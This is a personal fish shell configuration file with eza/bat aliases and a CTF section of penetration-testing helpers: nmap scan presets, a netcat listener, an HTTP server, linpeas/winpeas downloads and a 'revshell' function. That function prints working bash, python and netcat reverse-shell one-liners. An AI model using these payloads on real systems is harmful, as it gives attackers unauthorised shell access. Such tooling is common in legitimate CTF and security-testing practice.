if status is-interactive
    set -g fish_greeting

    fish_add_path -g ~/.local/bin

    starship init fish | source

    alias ls "eza --icons --group-directories-first"
    alias ll "eza -la --icons --group-directories-first"
    alias lt "eza -T --icons --group-directories-first"
    alias la "eza -a --icons --group-directories-first"
    alias cat "bat --style=plain --paging=never"

    set -gx EZA_COLORS "uu=38;2;204;107;168:gu=38;2;158;122;191"

    # ── CTF ──

    function target -d "Set or show target"
        if test (count $argv) -eq 0
            if set -q TARGET; echo $TARGET; else; echo "usage: target <ip>"; end
            return
        end
        set -gx TARGET $argv[1]
        echo $TARGET
    end

    function scan -d "Nmap scan against TARGET"
        if not set -q TARGET; echo "target not set"; return 1; end
        mkdir -p nmap
        switch $argv[1]
            case quick q;  nmap -sC -sV -oA nmap/quick $TARGET
            case full f;   nmap -p- -T4 --min-rate 5000 -oA nmap/full $TARGET
            case udp u;    sudo nmap -sU --top-ports 50 -oA nmap/udp $TARGET
            case vuln v;   nmap --script vuln -oA nmap/vuln $TARGET
            case '*';      echo "scan [quick|full|udp|vuln]"
        end
    end

    function serve -d "HTTP server"
        python3 -m http.server (test (count $argv) -gt 0; and echo $argv[1]; or echo 8000)
    end

    function listen -d "Netcat listener"
        set -l port (test (count $argv) -gt 0; and echo $argv[1]; or echo 4444)
        rlwrap nc -nlvp $port 2>/dev/null; or nc -nlvp $port
    end

    function myip -d "Show IPs"
        ip -o -4 addr show scope global | awk '{split($4,a,"/"); printf "  %-12s %s\n", $2, a[1]}'
    end

    function ctf -d "Create workspace"
        if test (count $argv) -eq 0; echo "usage: ctf <name>"; return 1; end
        set -l dir ~/CTF/$argv[1]
        mkdir -p $dir/{nmap,loot,www,notes}
        cd $dir
        echo $dir
    end

    function extract -d "Extract archives"
        if test (count $argv) -eq 0; echo "usage: extract <file>"; return 1; end
        switch $argv[1]
            case '*.tar.gz' '*.tgz';     tar xzf $argv[1]
            case '*.tar.bz2' '*.tbz2';   tar xjf $argv[1]
            case '*.tar.xz';             tar xJf $argv[1]
            case '*.tar';                tar xf $argv[1]
            case '*.zip';                unzip $argv[1]
            case '*.gz';                 gunzip $argv[1]
            case '*.7z';                 7z x $argv[1]
            case '*.rar';                unrar x $argv[1]
            case '*';                    echo "unknown format"
        end
    end

    function revshell -d "Reverse shell payloads"
        set -l ip (ip -4 addr show tun0 2>/dev/null | grep -oP 'inet \K[\d.]+')
        test -z "$ip"; and set ip (ip -4 addr show scope global 2>/dev/null | grep -oP 'inet \K[\d.]+' | grep -v '172.17' | head -1)
        set -l port (test (count $argv) -gt 0; and echo $argv[1]; or echo 4444)
        echo "  $ip:$port"
        echo ""
        echo "  bash -i >& /dev/tcp/$ip/$port 0>&1"
        echo ""
        echo "  python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"$ip\",$port));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'"
        echo ""
        echo "  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f"
    end

    function peas -d "Download linpeas/winpeas"
        set -l dir ~/CTF/.tools; mkdir -p $dir
        switch $argv[1]
            case lin linux
                test -f $dir/linpeas.sh; or curl -sL "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh" -o $dir/linpeas.sh
                cp $dir/linpeas.sh .; echo "linpeas.sh"
            case win windows
                test -f $dir/winPEASx64.exe; or curl -sL "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe" -o $dir/winPEASx64.exe
                cp $dir/winPEASx64.exe .; echo "winPEASx64.exe"
            case '*'; echo "peas [lin|win]"
        end
    end

    abbr -a gc 'git clone'
    abbr -a py 'python3'
    abbr -a pup 'python3 -m http.server'

    function exs -d "Open Exegol shell in current split"
        set -l name (docker ps --filter "name=exegol" --format '{{.Names}}' | head -1)
        if test -n "$name"
            docker exec -it $name zsh
        else
            echo "no exegol container running"
        end
    end
end
